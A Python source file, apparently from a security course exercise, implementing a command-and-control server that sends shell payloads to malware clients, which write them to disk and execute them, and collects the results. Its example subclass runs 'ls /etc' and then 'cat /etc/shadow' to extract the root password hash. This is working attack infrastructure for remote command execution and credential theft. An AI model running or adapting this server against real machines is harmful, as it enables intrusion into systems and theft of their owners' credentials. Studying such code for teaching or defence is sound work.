import socket
import struct

from typing import Callable


class EarlyDisconnect(OSError):
    pass


class CommandServer(object):
    """The base class for a C&C server. DON'T MODIFY THIS CODE!"""

    def __init__(self, payloads=None):
        self.payloads = payloads or []

    def run_server(self, host: str, port: int):
        listener = socket.socket()
        try:
            print(f'listening on {host}:{port}')
            listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            listener.bind((host, port))
            listener.listen(1)
            while self.payloads:
                print(
                    f'{len(self.payloads)} payloads pending, accepting connections')
                connection, address = listener.accept()
                try:
                    print(
                        f'handling connection from {address[0]}:{address[1]}')
                    self.handle_connection(connection)
                except EarlyDisconnect:
                    print('ERROR: The client disconnected early')
                finally:
                    connection.close()
        finally:
            listener.close()

    def _send(self, connection: socket.socket, data: bytes):
        if connection.send(data) != len(data):
            raise EarlyDisconnect()
        return len(data)

    def _recv(self, connection: socket.socket, count):
        result = connection.recv(count)
        if len(result) != count:
            raise EarlyDisconnect()
        return result

    def handle_connection(self, connection):
        payload, product_handler = self.payloads.pop(0)
        print(f'Sending {len(payload)} bytes of payload')
        self._send(connection, struct.pack('!I', len(payload)))
        self._send(connection, payload)
        product_size, = struct.unpack('!I', self._recv(connection, 4))
        print(f'Receiving {product_size} bytes of product')
        if product_size > 0:
            product = self._recv(connection, product_size)
        else:
            product = b''
        if product_handler:
            print('handling product')
            product_handler(product)

    def add_payload(self, payload: bytes, handler: Callable[[bytes], None]):
        """Add a payload, and a callback function to execute on its results.

        Args:
            payload: The payload to be executed by the malware. This is written
                to disk and executed as is.
            handler: A function receiving `bytes` to be invoked on the result
                returned from executing the payload.
        """
        self.payloads.append((payload, handler))


class ExampleServer(CommandServer):
    """An example server to list the files in /etc and read the root password"""

    def __init__(self):
        super(ExampleServer, self).__init__()
        self.add_payload(b"/bin/ls /etc", self.handle_ls)

    def handle_ls(self, product: bytes):
        # Convert back from bytes to string
        product = product.decode('latin-1')
        for line in product.splitlines():
            if line.strip() == 'shadow':
                print('/etc/shadow found, adding payload to get it')
                self.add_payload(b'cat /etc/shadow', self.handle_cat_shadow)

    def handle_cat_shadow(self, product: bytes):
        # Convert back from bytes to string
        product = product.decode('latin-1')
        for line in product.splitlines():
            if line.startswith('root:'):
                password_hash = line.split(':')[1]
                print(f'Got root password hash: {password_hash}')


if __name__ == '__main__':
    ExampleServer().run_server(host='0.0.0.0', port=8000)
